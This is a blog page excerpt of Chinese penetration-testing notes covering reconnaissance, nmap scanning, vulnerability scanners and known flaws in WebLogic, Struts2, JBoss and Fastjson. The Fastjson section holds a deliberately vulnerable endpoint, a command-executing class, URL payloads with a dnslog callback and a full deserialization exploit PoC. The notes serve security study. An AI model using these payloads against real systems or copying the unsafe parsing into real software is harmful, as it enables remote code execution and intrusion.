<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/2/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/2/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/08/14/%E6%B8%97%E9%80%8F/">渗透测试</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      
        <h2 id="一、信息搜集"   >
          <a href="#一、信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2>
      
        <h3 id="1-子域名"   >
          <a href="#1-子域名" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-子域名" class="headerlink" title="1.子域名"></a>1.子域名</h3>
      <ul>
<li><p>google hacking</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com</span><br><span class="line">inurl:php?id=1</span><br></pre></td></tr></table></div></figure></li>
<li><p>三方网站查询</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com</span><br><span class="line">http://tool.chinaz.com/subdomain</span><br><span class="line">FOFA</span><br></pre></td></tr></table></div></figure></li>
<li><p>SSL证书查询</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/</span><br></pre></td></tr></table></div></figure></li>
<li><p>JS文件发现子域名</p>
<p>安装一下，可以使用，原理就是网站源代码下保存的各种子域名</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Threezh1/JSFinder</span><br></pre></td></tr></table></div></figure></li>
<li><p>子域名爆破工具：……</p>
<p>或者在线工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br></pre></td></tr></table></div></figure></li>
<li><p><strong>OneForAll</strong>：安装使用，设置API很好用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="2-IP搜集"   >
          <a href="#2-IP搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IP搜集" class="headerlink" title="2.IP搜集"></a>2.IP搜集</h3>
      <p>有的服务开启了CDN之后，真实的服务器在北京，可是福建也存在它的服务备份，所以当我们从福建进行域名访问时，其访问到的IP就可能是在福建的IP，而不是其在北京的真实服务区的IP。所以有的时候需要绕过。</p>
<ul>
<li><p>多地Ping</p>
<p>挑选最多的IP从而判断真实IP</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ping.chinaz.com</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br></pre></td></tr></table></div></figure></li>
<li><p>国外服务区Ping</p>
<p>CDN由于昂贵，一般不对国外的服务提供CDN服务，所以使用国外服务区进行Ping一般可以找到真实IP。</p>
</li>
<li><p>查看子域名的IP，通过Ping子域名查看</p>
</li>
<li><p>查询历史DNS记录</p>
<p>由于最开始建设网站没有CDN的时候域名对应真实IP，所以拿到最开始那一段时间的可以看到真实IP</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn</span><br><span class="line">https://securitytrails.com</span><br><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="3-C段存活主机探测"   >
          <a href="#3-C段存活主机探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-C段存活主机探测" class="headerlink" title="3.C段存活主机探测"></a>3.C段存活主机探测</h3>
      <ul>
<li><p>nmap工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP www.xxx.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></div></figure></li>
<li><p>其他工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/se55i0n/Cwebscanner</span><br></pre></td></tr></table></div></figure></li>
<li><p>常用命令</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -v -T4 -oG Discover.gnmap 172.26.1.0/24     <span class="comment">#主机探测</span></span><br><span class="line">grep <span class="string">&quot;Status: Up&quot;</span> Discover.gnmap | cut -f 2 -d <span class="string">&#x27;&#x27;</span> &gt; LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#系统扫描</span></span><br><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#版本检测</span></span><br><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="4-其他信息搜集"   >
          <a href="#4-其他信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-其他信息搜集" class="headerlink" title="4.其他信息搜集"></a>4.其他信息搜集</h3>
      <ul>
<li><p>历史漏洞信息</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://wy.zone.ci/</span><br><span class="line">https://wooyun.kieran.top/#!/</span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/ 	#漏洞查找</span><br><span class="line"></span><br><span class="line">https://wiki.0-sec.org/#/md</span><br><span class="line"></span><br><span class="line">https://www.seebug.org/</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="二、网站信息搜集"   >
          <a href="#二、网站信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、网站信息搜集" class="headerlink" title="二、网站信息搜集"></a>二、网站信息搜集</h2>
      
        <h3 id="1-网站指纹识别"   >
          <a href="#1-网站指纹识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-网站指纹识别" class="headerlink" title="1.网站指纹识别"></a>1.网站指纹识别</h3>
      <ul>
<li><p>操作系统</p>
<ul>
<li><p>ping：</p>
<p>windows的TTL值一般为128，Linux则为64。TTL大于100一般为windows，几十一般为linux。</p>
</li>
<li><p>nmap -O扫描</p>
</li>
<li><p>windows大小写不敏感，Linux则很区分大小写</p>
</li>
</ul>
</li>
<li><p>中间件</p>
<ul>
<li><p>F12响应头Server字段</p>
</li>
<li><p>whatweb：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.whatweb.net/</span><br></pre></td></tr></table></div></figure></li>
<li><p>wappalyzer浏览器插件</p>
</li>
</ul>
</li>
<li><p>语言识别</p>
<ul>
<li>PHP、ASP等等</li>
<li>数据库类型等</li>
</ul>
</li>
<li><p>CMS识别：</p>
<p>内容管理系统，用于网站内容文章管理，常见有dedecms、Discuz、phpcms等</p>
<ul>
<li><p>识别工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://whatweb.bugscaner.com/look/</span><br><span class="line">https://github.com/iceyhexman/onlinetools</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="2-敏感文件、目录探测"   >
          <a href="#2-敏感文件、目录探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-敏感文件、目录探测" class="headerlink" title="2.敏感文件、目录探测"></a>2.敏感文件、目录探测</h3>
      <p>常见有</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">github 			#直接github上搜索该网站</span><br><span class="line">.git			#GitHack自动化利用,原理是本地和远程相互备份了</span><br><span class="line">.svn</span><br><span class="line">.DS_Store  #苹果操作系统的文件</span><br><span class="line">.hg</span><br><span class="line">.bzr</span><br><span class="line">cvs</span><br><span class="line"></span><br><span class="line">WEB-INF			</span><br><span class="line">#是JAVA的WEB应用的安全目录,如果想要在页面中直接访问其中的文件,必须要通过web.xml文件对要访问的文件进行相应的映射才能访问。</span><br><span class="line"></span><br><span class="line">www.zip</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch</span><br><span class="line">御剑</span><br><span class="line">https://github.com/H4ckForJob/dirmap</span><br></pre></td></tr></table></div></figure></li>
<li><p>针对漏洞的信息泄露</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LandGrey/SpringBootVulExploit</span><br><span class="line">https://github.com/rabbitmask/SB-Actuator</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="3-网站WAF识别"   >
          <a href="#3-网站WAF识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站WAF识别" class="headerlink" title="3.网站WAF识别"></a>3.网站WAF识别</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br><span class="line">nmap -p80,443 --script http-waf-detect ip</span><br><span class="line">nmap -p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></div></figure>




        <h2 id="三、漏洞扫描"   >
          <a href="#三、漏洞扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、漏洞扫描" class="headerlink" title="三、漏洞扫描"></a>三、漏洞扫描</h2>
      
        <h3 id="1-针对性漏洞"   >
          <a href="#1-针对性漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-针对性漏洞" class="headerlink" title="1.针对性漏洞"></a>1.针对性漏洞</h3>
      <ul>
<li><p>SQL：sqlmap</p>
</li>
<li><p>weblogic：weblogicscan</p>
</li>
<li><p>CMS</p>
<ul>
<li>wordpress：wpscan</li>
<li>dedecms：dedecmsscan</li>
</ul>
</li>
<li><p>应用层：nessus</p>
</li>
<li><p>某类框架：Struts2(Struts2漏洞检测工具)、sprintboot(SB-Actuator)</p>
</li>
<li><p>web服务：xray、awvs</p>
</li>
</ul>

        <h3 id="2-awvs"   >
          <a href="#2-awvs" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-awvs" class="headerlink" title="2.awvs"></a>2.awvs</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113110028639.png" alt="image-20221113110028639"></p>

        <h2 id="四、常见漏洞"   >
          <a href="#四、常见漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、常见漏洞" class="headerlink" title="四、常见漏洞"></a>四、常见漏洞</h2>
      
        <h3 id="1-weblogic"   >
          <a href="#1-weblogic" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-weblogic" class="headerlink" title="1.weblogic"></a>1.weblogic</h3>
      <ul>
<li><p>端口：7001</p>
</li>
<li><p>Web界面特征：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113111840633.png" alt="image-20221113111840633"></p>
</li>
</ul>

        <h3 id="2-Thinkphp5"   >
          <a href="#2-Thinkphp5" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Thinkphp5" class="headerlink" title="2.Thinkphp5"></a>2.Thinkphp5</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/admintony/thinkPHPBatchPoc</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-Struts2"   >
          <a href="#3-Struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Struts2" class="headerlink" title="3.Struts2"></a>3.Struts2</h3>
      <ul>
<li><p>框架识别：</p>
<ul>
<li><code>.do</code>或者<code>.action</code>后缀</li>
<li><code>/struts/webconsole.html</code>界面：需要开启<code>devMode</code></li>
</ul>
</li>
<li><p>工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/HatBoy/Struts2-Scan</span><br></pre></td></tr></table></div></figure></li>
<li><p>常见漏洞：</p>
<ul>
<li><p>struts2-045：CVE-2017-5638，可代码执行，版本在2.3.5<del>2.3.31和2.5</del>2.5.10</p>
<p>在使用基于Jakarta插件的文件上传功能时，可能存在远程命令执行。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85674" >https://www.anquanke.com/post/id/85674</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
</li>
</ul>

        <h3 id="4-Jboss"   >
          <a href="#4-Jboss" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Jboss" class="headerlink" title="4.Jboss"></a>4.Jboss</h3>
      <p>JAVA EE应用服务器，通常与Tomcat或jetty绑定使用</p>
<ul>
<li><p>框架识别：</p>
<ul>
<li><p>8080端口：6…版本</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115127399.png" alt="image-20221113115127399"></p>
</li>
<li><p>1741端口：7…版本</p>
</li>
</ul>
</li>
<li><p>工具：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GGyao/jbossScan</span><br></pre></td></tr></table></div></figure></li>
<li><p>常见漏洞：</p>
<ul>
<li><p>CVE-2017-12149</p>
<p>JAVA反序列化错误，在过滤器没有进行检查。</p>
<p>访问<code>/invoker/readonly</code>显示500可能存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115659179.png" alt="image-20221113115659179"></p>
<p>可使用如下工具进行反弹shell</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joaomatosf/jexboss</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="5-Fastjson"   >
          <a href="#5-Fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Fastjson" class="headerlink" title="5.Fastjson"></a>5.Fastjson</h3>
      <ul>
<li><p>识别：</p>
<ul>
<li>出现json格式的地方就又可能使用了fastjson（<code>Content-type:application/json</code>）</li>
</ul>
</li>
<li><p>原理：</p>
<p>在<code>FastJson</code> 中有一个<code>@type</code> 参数，能将我们反序列化后的类转为<code>@type</code> 中指定的类，然后在反序列化过程中会自动调用类中的<code>setter</code>， <code>getter</code> 和构造器，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb" >FastJason 1.2.22-1.2.24 TemplatesImpl利用链分析 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用<code>springboot</code>时如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/fast&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FastVuln1</span><span class="params">(<span class="meta">@RequestParam(name=&quot;evil&quot;)</span> String evil)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Object obj = JSON.parseObject(evil,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    System.out.println(obj.getClass().getName());</span><br><span class="line">    <span class="keyword">return</span> evil;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关<code>Evil</code>类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjsondemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Evil&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmd=&#x27;&quot;</span> + cmd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>对应的<code>payload</code>为，记得<code>url</code>编码一下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/fast?evil=&#123;&quot;@type&quot;:&quot;com.example.fastjsondemo.Evil&quot;,&quot;cmd&quot;:&quot;touch ccc&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p>或者利用一下<code>dnslog</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/fast?evil=&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;je85rk.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></div></figure>

<p>结合<code>JAVA</code>反序列化的知识，得到<code>POC</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjsondemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.time.temporal.Temporal;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clas = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        String cmd = <span class="string">&quot;Runtime.getRuntime().exec(\&quot;touch dddd\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        clas.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        String EvilCode = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="comment">//System.out.println(EvilCode);</span></span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String GADGAT_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String evil = poc.generateEvil();</span><br><span class="line">        String PoC = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(PoC);</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="6-shiro"   >
          <a href="#6-shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-shiro" class="headerlink" title="6.shiro"></a>6.shiro</h3>
      <p>环境搭建：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46127592/article/details/123999749" >(47条消息) shiro debug 调试_scanner010的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
